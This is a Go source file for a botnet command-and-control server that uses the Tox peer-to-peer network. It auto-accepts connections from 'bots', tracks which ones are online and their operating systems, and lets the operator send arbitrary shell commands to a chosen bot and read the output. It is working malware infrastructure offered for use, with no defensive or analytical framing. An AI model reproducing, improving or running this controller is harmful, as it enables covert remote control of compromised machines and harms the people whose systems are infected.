package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"

	"time"

	tox "github.com/TokTok/go-toxcore-c"
)

func init() {
	log.SetFlags(log.Flags() | log.Lshortfile)
}

var server = []interface{}{
	"205.185.116.116", uint16(33445), "A179B09749AC826FF01F37A9613F6B57118AE014D4196A0E1105A98F93A54702",
}

var fname = "./tox.data"
var debug = false
var nickPrefix = "Odin"
var statusText = "Revered immortal."

var fv []uint32     // Bots list
var online []string // Online bots list

var commandHistory []string

// Color section
var colorReset = "\033[0m"
var colorRed = "\033[31m"
var colorGreen = "\033[32m"
var colorYellow = "\033[33m"
var colorBlue = "\033[34m"
var colorPurple = "\033[35m"
var colorCyan = "\033[36m"
var colorWhite = "\033[37m"
var colorBlack = "\033[30m"
var colorGrey = "\033[31m"

// ListBots (Return text bool, id return type)
func ListBots(t *tox.Tox, id string) []uint32 {
	
	fv := t.SelfGetFriendList()
	if id != "none" {
		if id == "all" {
			fmt.Println(string(colorPurple), "\n\tBots:", string(colorReset))
			fmt.Println(string(colorBlue))
			for _, fno := range fv {
				fid, err := t.FriendGetPublicKey(fno)
				if err != nil {
					log.Println(err)
				}
				fmt.Println("\t\t[ ID:", fno, "]", fid)
			}
			fmt.Println(string(colorReset))
		} else if id == "online" {
			if len(online) > 0 {
				fmt.Println(string(colorPurple), "\n\tOnline bots:", string(colorReset))
				fmt.Println(string(colorGreen))
				for _, online := range online {
					values := strings.Fields(online)
					fno, err := strconv.Atoi(values[0])
					if err != nil {
						log.Println(err)
					}
					fid, err := t.FriendGetPublicKey(uint32(fno))
					if err != nil {
						log.Println(err)
					}
					os := values[1]
					fmt.Println("\n\t\t[ ID:", fno, "]", fid, "@", os)
				}
			} else {
				fmt.Println(string(colorPurple), "\nBot(s) offline... Please wait.\n", string(colorReset))
			}
		}
	}

	return fv
}

// Find - Finding duplicates in online bots array
func Find(slice []string, val string) (int, bool) {
	for i, item := range slice {
		stringItem := fmt.Sprint(item)
		if stringItem == val {
			return i, true
		}
	}
	return -1, false
}

// SendMessage - message
func SendMessage(t *tox.Tox, friendNumber uint32, message string) error {
	_, err := t.FriendSendMessage(friendNumber, message)
	if err != nil {
		return err
	}
	return nil
}

// showC2 - Display a banner of the C2 Tox ID
func showC2(toxid string) {

	fmt.Println(string(colorYellow), `
	 _____                 __       _   
	/__   \ ___ __  __  /\ \ \ ___ | |_ 
	  / /\// _ \\ \/ / /  \/ // _ \| __|
	 / /  | (_) |>  < / /\  /|  __/| |_ 
	 \/    \___//_/\_\\_\ \/  \___| \__|
	`, string(colorReset))

	fmt.Println("")
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorRed), "C2:", toxid, string(colorReset))
	fmt.Println("\t\t\t\t\t", string(colorBlack), strings.Repeat("#", 80), string(colorReset))
	fmt.Println("")
}

// helpCommands
func helpCommands(help string) {
	fmt.Println(string(colorPurple), "\n\tExamples:", help, string(colorReset))
	if help == "" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots - Displays examples of controlling bots")
		fmt.Println("\t\tcommands - Display previous commands")
		fmt.Println("\t\tclear - Clear the console")
		fmt.Println(string(colorReset))
	} else if help == "bots" {
		fmt.Println(string(colorYellow))
		fmt.Println("\t\tbots list all - List all bots: [ID] ToxID")
		fmt.Println("\t\tbots list amount - List amount of bots")
		fmt.Println("\t\tbots list online - List online bots")
		fmt.Println("\t\tbots interact <id> os - Return operating system")
		fmt.Println("\t\tbots interact <id> ! ls -lah - Execute shell command")
		fmt.Println(string(colorReset))
	}
}

func main() {
	opt := tox.NewToxOptions()
	if tox.FileExist(fname) {
		data, err := ioutil.ReadFile(fname)
		if err != nil {
			log.Println(err)
		} else {
			opt.Savedata_data = data
			opt.Savedata_type = tox.SAVEDATA_TYPE_TOX_SAVE
		}
	}
	opt.Tcp_port = 33445
	var t *tox.Tox
	for i := 0; i < 5; i++ {
		t = tox.NewTox(opt)
		if t == nil {
			opt.Tcp_port++
		} else {
			break
		}
	}

	r, err := t.Bootstrap(server[0].(string), server[1].(uint16), server[2].(string))
	r2, err := t.AddTcpRelay(server[0].(string), server[1].(uint16), server[2].(string))
	if debug {
		log.Println("bootstrap:", r, err, r2)
	}

	pubkey := t.SelfGetPublicKey()
	seckey := t.SelfGetSecretKey()
	toxid := t.SelfGetAddress()
	if debug {
		log.Println("keys:", pubkey, seckey, len(pubkey), len(seckey))
	}

	defaultName := t.SelfGetName()
	humanName := nickPrefix + toxid[0:5]
	if humanName != defaultName {
		t.SelfSetName(humanName)
	}
	humanName = t.SelfGetName()
	if debug {
		log.Println(humanName, defaultName, err)
	}

	defaultStatusText, err := t.SelfGetStatusMessage()
	if defaultStatusText != statusText {
		t.SelfSetStatusMessage(statusText)
	}
	if debug {
		log.Println(statusText, defaultStatusText, err)
	}

	sz := t.GetSavedataSize()
	sd := t.GetSavedata()
	if debug {
		log.Println("savedata:", sz, t)
		log.Println("savedata", len(sd), t)
	}
	err = t.WriteSavedata(fname)
	if debug {
		log.Println("savedata write:", err)
	}

	// Show C2 address
	showC2(toxid)

	// Server load, pull all bots
	fv = ListBots(t, "none")
	fmt.Println(string(colorPurple))
	fmt.Println("\tTotal bots:", len(fv))
	fmt.Println(string(colorReset))

	// Console for commands
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print(string(colorGreen), "\n-> ", string(colorReset), string(colorGrey))
			text, _ := reader.ReadString('\n')
			text = strings.Replace(text, "\n", "", -1)

			commandHistory = append(commandHistory, text)

			if text == "commands" {
				fmt.Println(string(colorPurple), "\n\n\tHistory:", string(colorReset))
				for _, command := range commandHistory {
					fmt.Println(string(colorYellow), "\t\t", command, string(colorReset))
				}
			}

			fmt.Println(string(colorReset))
			if strings.HasPrefix(text, "bots") {
				args := strings.Fields(text)
				if len(args) >= 3 {
					if args[1] == "list" {
						if args[2] == "all" {
							fv = ListBots(t, "all")
						} else if args[2] == "amount" {
							fv = ListBots(t, "none")
							fmt.Println(string(colorPurple))
							fmt.Println("\tTotal bots:", len(fv))
							fmt.Println(string(colorReset))
						} else if args[2] == "online" {
							fv = ListBots(t, "online")
						}
					} else if args[1] == "interact" {
						if len(args) >= 3 {
							botid, err := strconv.Atoi(args[2])
							if err != nil {
								log.Println(err)
							}
							if botid < len(fv) {
								commands := args[3:len(args)]
								command := strings.Join(commands, " ")
								err = SendMessage(t, fv[botid], command)
								if err != nil {
									fmt.Println("Bot offline...")
								}
							}
						}
					}
				} else {
					helpCommands("bots")
				}

			} else if text == "help" {
				helpCommands("")
			} else if text == "clear" {
				fmt.Print("\033[H\033[2J")
				showC2(toxid)
			} else if text == "exit" {
				fmt.Println("\tGoodbye!")
				os.Exit(1)
			}
		}
	}()

	if debug {
		log.Println("add friends:", len(fv))
	}

	// Auto accept
	t.CallbackFriendRequest(func(t *tox.Tox, friendId string, message string, userData interface{}) {
		//fmt.Println("New connection", friendId, message)
		num, err := t.FriendAddNorequest(friendId)
		fv = ListBots(t, "none")

		if debug {
			log.Println("on friend request:", num, err)
		}
		if num < 100000 {
			t.WriteSavedata(fname)
		}
	}, nil)

	// On message
	t.CallbackFriendMessage(func(t *tox.Tox, friendNumber uint32, message string, userData interface{}) {
		if debug {
			log.Println("on friend message:", friendNumber, message)
		}
		if strings.HasPrefix(message, "update") {

			values := strings.Fields(message)

			str := fmt.Sprint(friendNumber)

			foundBot := str + " " + values[1]

			_, found := Find(online, foundBot)
			if !found {
				online = append(online, foundBot)
			}
		} else {
			fmt.Print("Output:\n\n", message, string(colorReset), "\n\n->")
		}

	}, nil)

	// toxcore loops
	shutdown := false
	loopc := 0
	itval := 0
	for !shutdown {
		iv := t.IterationInterval()
		if iv != itval {
			if debug {
				if itval-iv > 20 || iv-itval > 20 {
					log.Println("tox itval changed:", itval, iv)
				}
			}
			itval = iv
		}

		t.Iterate()
		status := t.SelfGetConnectionStatus()
		if loopc%5500 == 0 {
			if status == 0 {
				if debug {
					fmt.Print(".")
				}
			} else {
				if debug {
					fmt.Print(status, ",")
				}
			}
		}
		loopc++
		time.Sleep(1000 * 50 * time.Microsecond)
	}

	t.Kill()

}

func makekey(no uint32, a0 interface{}, a1 interface{}) string {
	return fmt.Sprintf("%d_%v_%v", no, a0, a1)
}

func init() {
	tox.KeepPkg()
}
